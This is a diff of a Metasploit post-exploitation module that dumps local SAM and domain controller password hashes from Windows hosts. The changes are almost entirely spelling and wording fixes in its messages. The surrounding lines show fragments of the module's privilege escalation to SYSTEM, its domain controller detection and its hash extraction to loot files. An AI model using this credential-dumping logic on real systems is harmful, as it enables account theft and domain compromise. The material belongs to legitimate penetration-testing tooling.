@@ -28,10 +28,12 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'Windows Gather Local and Domain Controler Account Password Hashes',
-				'Description'   => %q{ This will dump local accounts from the SAM Database and if the targets
-						host is a Domain Controller the Domain Account Database using the proper
-						technique depending on privilage level, OS and Role of host.},
+				'Name'          => 'Windows Gather Local and Domain Controller Account Password Hashes',
+				'Description'   => %q{
+						This will dump local accounts from the SAM Database and if the targets
+					host is a Domain Controller the Domain Account Database using the proper
+					technique depending on privilege level, OS and role of the host.
+				},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
 				'Version'       => '$Revision$',
@@ -40,7 +42,7 @@ class Metasploit3 < Msf::Post
 			))
 		register_options(
 			[
-				OptBool.new('GETSYSTEM', [ false, 'Attempt to get SYSTEM Privilege on the target host.', false])
+				OptBool.new('GETSYSTEM', [ false, 'Attempt to get SYSTEM privilege on the target host.', false])
 
 			], self.class)
 		@smb_port = 445
@@ -77,8 +79,8 @@ class Metasploit3 < Msf::Post
 		print_status("Running module against #{sysinfo['Computer']}")
 		host = Rex::FileUtils.clean_path(sysinfo["Computer"])
 		hash_file = store_loot("windows.hashes", "text/plain", session, "", "#{host}_hashes.txt", "Windows Hashes")
-		print_status("Hashes will be saved to the Database if one is connected.")
-		print_status("Hashes will be saved in loot in John Password File format to:")
+		print_status("Hashes will be saved to the database if one is connected.")
+		print_status("Hashes will be saved in loot in JtR password file format to:")
 		print_status(hash_file)
 		smart_hash_dump(datastore['GETSYSTEM'], hash_file)
 	end
@@ -301,7 +303,7 @@ class Metasploit3 < Msf::Post
 			raise $!
 		rescue ::Rex::Post::Meterpreter::RequestError => e
 			print_error("Meterpreter Exception: #{e.class} #{e}")
-			print_error("This script requires the use of a SYSTEM user context (hint: migrate into service process)")
+			print_error("This module requires the use of a SYSTEM user context (hint: migrate into service process)")
 		rescue ::Exception => e
 			print_error("Error: #{e.class} #{e} #{e.backtrace}")
 		end
@@ -355,7 +357,7 @@ class Metasploit3 < Msf::Post
 		serviceskey = "HKLM\\SYSTEM\\CurrentControlSet\\Services"
 		if registry_enumkeys(serviceskey).include?("NTDS")
 			if registry_enumkeys(serviceskey + "\\NTDS").include?("Parameters")
-				print_good("\tThis host is a Domain Contoller!")
+				print_good("\tThis host is a Domain Controller!")
 				is_dc_srv = true
 			end
 		end
@@ -408,7 +410,7 @@ class Metasploit3 < Msf::Post
 							move_to_sys
 							file_local_write(pwdfile,inject_hashdump)
 						else
-							print_error("Could not get Domain Hashes!")
+							print_error("Could not get NTDS hashes!")
 						end
 					end
 
@@ -427,10 +429,10 @@ class Metasploit3 < Msf::Post
 						file_local_write(pwdfile,inject_hashdump)
 					rescue
 						if migrate_system
-							print_status("Trying to get SYSTEM Privilege")
+							print_status("Trying to get SYSTEM privilege")
 							results = session.priv.getsystem
 							if results[0]
-								print_good("Got SYSTEM Privelege")
+								print_good("Got SYSTEM privilege")
 								if session.sys.config.sysinfo['OS'] =~ /(Windows 2008)/i
 									# Migrate process since on Windows 2008 R2 getsystem
 									# does not set certain privilege tokens required to
@@ -439,22 +441,22 @@ class Metasploit3 < Msf::Post
 								end
 								file_local_write(pwdfile,inject_hashdump)
 							else
-								print_error("Could not obtain System Privileges")
+								print_error("Could not obtain SYSTEM privileges")
 							end
 						else
-							print_error("Could not get Domain Hashes!")
+							print_error("Could not get NTDS hashes!")
 						end
 
 					end
 				elsif sysinfo['OS'] =~ /(Windows 7|2008|Vista)/i
 					if migrate_system
-						print_status("Trying to get SYSTEM Privilege")
+						print_status("Trying to get SYSTEM privilege")
 						results = session.priv.getsystem
 						if results[0]
-							print_good("Got SYSTEM Privelege")
+							print_good("Got SYSTEM privilege")
 							file_local_write(pwdfile,read_hashdump)
 						else
-							print_error("Could not obtain System Privileges")
+							print_error("Could not obtain SYSTEM privilege")
 						end
 					else
 						print_error("On this version of Windows you need to be NT AUTHORITY\\SYSTEM to dump the hashes")
@@ -463,13 +465,13 @@ class Metasploit3 < Msf::Post
 
 				else
 					if migrate_system
-						print_status("Trying to get SYSTEM Privilege")
+						print_status("Trying to get SYSTEM privilege")
 						results = session.priv.getsystem
 						if results[0]
-							print_good("Got SYSTEM Privelege")
+							print_good("Got SYSTEM privilege")
 							file_local_write(pwdfile,read_hashdump)
 						else
-							print_error("Could not obtain System Privileges")
+							print_error("Could not obtain SYSTEM privileges")
 						end
 					else
 						file_local_write(pwdfile,inject_hashdump)
@@ -479,7 +481,7 @@ class Metasploit3 < Msf::Post
 
 			end
 		else
-			print_error("Insuficient privileges to dump hashes!")
+			print_error("Insufficient privileges to dump hashes!")
 		end
 	end
 end
